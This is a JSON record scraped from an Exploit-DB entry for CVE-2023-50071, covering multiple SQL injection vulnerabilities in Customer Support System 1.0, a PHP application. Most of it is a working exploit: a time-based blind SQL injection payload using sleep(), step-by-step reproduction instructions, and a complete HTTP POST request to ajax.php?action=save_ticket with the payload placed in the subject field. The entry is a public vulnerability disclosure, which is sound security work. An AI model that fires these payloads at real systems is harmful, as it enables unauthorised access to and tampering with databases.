{"source": "https://www.exploit-db.com/exploits/51862", "vulnName": "CVE-2023-50071 - Multiple SQL Injection", "vulnEDBID": "51862", "vulnCVE": "N/A", "author": "GERALDO ALCANTARA", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-06", "vulnContent": "# Exploit Title: Customer Support System 1.0 - Multiple SQL injection\nvulnerabilities\n# Date: 15/12/2023\n# Exploit Author: Geraldo Alcantara\n# Vendor Homepage:\nhttps://www.sourcecodester.com/php/14587/customer-support-system-using-phpmysqli-source-code.html\n# Software Link:\nhttps://www.sourcecodester.com/download-code?nid=14587&title=Customer+Support+System+using+PHP%2FMySQLi+with+Source+Code\n# Version: 1.0\n# Tested on: Windows\n# CVE : CVE-2023-50071\n*Description*: Multiple SQL injection vulnerabilities in\n/customer_support/ajax.php?action=save_ticket in Customer Support\nSystem 1.0 allow authenticated attackers to execute arbitrary SQL\ncommands via department_id, customer_id and subject.*Payload*:\n'+(select*from(select(sleep(20)))a)+'\n*Steps to reproduce*:\n\n1- Log in to the application.\n\n2- Navigate to the page /customer_support/index.php?page=new_ticket.\n\n3- Create a new ticket and insert a malicious payload into one of the\nfollowing parameters: department_id, customer_id, or subject.\n*Request:*\nPOST /customer_support/ajax.php?action=save_ticket HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0)\nGecko/20100101 Firefox/120.0\nAccept: */*\nAccept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data;\nboundary=---------------------------81419250823331111993422505835\nContent-Length: 853\nOrigin: http://192.168.68.148\nConnection: close\nReferer: http://192.168.68.148/customer_support/index.php?page=new_ticket\nCookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko;\nsessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq;\nPHPSESSID=mfd30tu0h0s43s7kdjb74fcu0l\n\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"id\"\n\n\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"subject\"\n\nteste'+(select*from(select(sleep(5)))a)+'\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"customer_id\"\n\n3\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"department_id\"\n\n4\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"description\"\n\n<p>Blahs<br></p>\n-----------------------------81419250823331111993422505835\nContent-Disposition: form-data; name=\"files\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n-----------------------------81419250823331111993422505835--\n            "}